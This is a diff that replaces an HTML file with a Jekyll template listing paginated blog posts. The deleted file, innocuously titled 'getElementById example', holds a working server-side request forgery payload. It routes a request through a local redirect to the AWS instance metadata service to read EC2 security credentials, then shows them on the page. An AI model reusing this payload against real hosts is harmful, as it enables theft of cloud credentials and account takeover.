@@ -1,24 +1,13 @@
-<html>
-<head>
-  <title>getElementById example</title>
-</head>
-<body>
-  <p id="output"></p>
-  <p id="status"></p>
-</body>
-<script>
-var url = "http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance";
-var xhr = new XMLHttpRequest();
-xhr.open("GET", url, true);
-xhr.setRequestHeader('X-aws-ec2-metadata-token','AQAEAHGwT3M_KqbhMa-xFy2FrztArcBrwc9dmQTV0pcnNSZEIUYRWg==');
-xhr.onload = function () {
-    if (xhr.readyState == 4 && xhr.status == "200") {
-        document.getElementById('output').innerHTML = xhr.responseText;
-    }
-        document.getElementById("status").innerHTML = xhr.status;
-        
-}
-xhr.send();
-document.getElementById("status").innerHTML = "foobar <3";
-</script>
-</html>
+---
+layout: default
+---
+
+<ul>
+    {% for post in paginator.posts %}
+      <li>
+          <h2><a href="{{ post.url | prepend: site.baseurl | replace: '//', '/' }}">{{ post.title }}</a></h2>
+          <time datetime="{{ post.date | date_to_xmlschema }}">{{ post.date | date_to_string }}</time>
+          <p>{{ post.content | strip_html | truncatewords:50 }}</p>
+      </li>
+    {% endfor %}
+</ul>
